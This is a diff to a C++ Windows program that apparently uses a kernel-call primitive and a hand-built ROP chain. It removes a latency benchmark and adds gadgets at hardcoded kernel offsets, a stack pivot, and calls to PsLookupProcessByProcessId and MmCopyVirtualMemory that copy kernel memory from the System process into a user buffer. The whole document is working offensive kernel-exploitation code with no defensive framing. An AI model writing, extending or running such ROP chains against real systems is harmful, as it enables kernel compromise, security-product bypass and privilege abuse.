@@ -29,44 +29,6 @@ static_assert(offsetof(PivotData, NewRbp) == 0x18, "NewRbp offset must be 0x18")
 static_assert(offsetof(PivotData, JumpAddress) == 0x50, "JumpAddress offset must be 0x50");
 static_assert(sizeof(PivotData) == 0x58, "PivotData size must be 0x58");
 
-void MeasureCommunicationSpeed(HANDLE UmEvent, HANDLE KmEvent, int iterations = 1000) {
-    // Initialize high-resolution timer
-    LARGE_INTEGER frequency, start, end;
-    QueryPerformanceFrequency(&frequency);
-    double freq = static_cast<double>(frequency.QuadPart); // Ticks per second
-
-    // Vector to store latency for each cycle (in seconds)
-    std::vector<double> latencies;
-    latencies.reserve(iterations);
-
-    // Measurement loop
-    for (int i = 0; i < iterations; ++i) {
-        QueryPerformanceCounter(&start); // Start timing
-        SetEvent(UmEvent);              // Signal UM event
-        WaitForSingleObject(KmEvent, INFINITE); // Wait for KM response
-        QueryPerformanceCounter(&end);  // End timing
-
-        // Calculate latency in seconds
-        double latency = static_cast<double>(end.QuadPart - start.QuadPart) / freq;
-        latencies.push_back(latency);
-    }
-
-    // Compute statistics
-    double sum = std::accumulate(latencies.begin(), latencies.end(), 0.0);
-    double average_latency = sum / iterations;
-    double speed_hz = 1.0 / average_latency; // Cycles per second
-    double min_latency = *std::min_element(latencies.begin(), latencies.end());
-    double max_latency = *std::max_element(latencies.begin(), latencies.end());
-
-    // Print results
-    std::printf("Measured %d communication cycles:\n", iterations);
-    std::printf("Total time: %.3f seconds\n", sum);
-    std::printf("Average latency: %.3f ms (%.3f us)\n", average_latency * 1000.0, average_latency * 1000000.0);
-    std::printf("Communication speed: %.2f cycles/second (Hz)\n", speed_hz);
-    std::printf("Min latency: %.3f ms\n", min_latency * 1000.0);
-    std::printf("Max latency: %.3f ms\n", max_latency * 1000.0);
-}
-
 int main()
 {
     if (!Utils::EnableDebugPrivilege())
@@ -111,6 +73,8 @@ int main()
     void* KmSourceStringArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x20, reinterpret_cast<void*>(MAXULONG64));
     void* KmObjectAttributeArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", sizeof(OBJECT_ATTRIBUTES), reinterpret_cast<void*>(MAXULONG64));
     void* KmOutputHandleArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
+    void* EProcessOutputArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
+    void* SystemEProcessOutputArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
     void* MainStackAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x6000, reinterpret_cast<void*>(MAXULONG64));
     void* InitStackAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x6000, reinterpret_cast<void*>(MAXULONG64));
     Globals::DummyMemoryAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
@@ -148,6 +112,34 @@ int main()
 
     InitStackManager.AddFunctionCall("RtlInitUnicodeString", (std::uint64_t)KmDestinationStringArg, (std::uint64_t)KmSourceStringArg);
     InitStackManager.AddFunctionCall("ZwOpenEvent", (std::uint64_t)KmOutputHandleArg, EVENT_MODIFY_STATE | SYNCHRONIZE, (std::uint64_t)KmObjectAttributeArg);
+
+    // Get usermode process
+    InitStackManager.AddFunctionCall("PsLookupProcessByProcessId", GetCurrentProcessId(), (std::uint64_t)EProcessOutputArg);
+    InitStackManager.AddFunctionCall("PsLookupProcessByProcessId", 4, (std::uint64_t)SystemEProcessOutputArg);
+
+    void* UmBufferTest = malloc(4096);
+
+    // first arg
+    InitStackManager.ReadIntoRcx((std::uint64_t)SystemEProcessOutputArg);
+    // fourth arg
+    InitStackManager.SetRdx((std::uint64_t)UmBufferTest);
+    InitStackManager.AddGadget(0x21307f, "mov rax, rdx; ret;");
+    InitStackManager.MovRaxIntoR9();
+    // third arg
+    InitStackManager.SetRdx((std::uint64_t)EProcessOutputArg);
+    InitStackManager.AddGadget(0x21307f, "mov rax, rdx; ret;");
+    InitStackManager.ReadRaxIntoRax();
+    InitStackManager.MovRaxIntoR8();
+    // second arg
+    InitStackManager.SetRdx(Globals::KernelBase);
+
+    InitStackManager.AlignStack();
+    InitStackManager.AddGadget(Driver::GetKernelFunctionOffset("MmCopyVirtualMemory"), "Function to call address");
+    InitStackManager.AddGadget(0x20268c, "add rsp, 0x38; ret;");
+    InitStackManager.AddPadding(0x20);
+    InitStackManager.AddValue(0x8, "size");
+    InitStackManager.AddValue(0, "mode");
+    InitStackManager.AddValue((std::uint64_t)Globals::DummyMemoryAllocation, "bytes addr");
 
     InitStackManager.PivotToNewStack(MainStackManager);
 
@@ -221,11 +213,20 @@ int main()
 
     KernelCaller.Call<void*, HANDLE>("ZwClose", KernelThreadHandle);
 
-    printf("Starting 1s\n");
-    Sleep(1000);
-    printf("Start\n");
+    printf("Starting\n");
 
-    MeasureCommunicationSpeed(UmEvent, KmEvent, 1000000);
+    for (int i = 0; i < 100; i++)
+    {
+        SetEvent(UmEvent);
+        WaitForSingleObject(KmEvent, INFINITE);
+    }
+
+    printf("Done\n");
+
+    printf("Waiting for input to print value\n");
+    printf("writing to %p\n", UmBufferTest);
+    std::cin.get();
+    printf("value: %p\n", *(void**)UmBufferTest);
 
     std::cin.get();
 
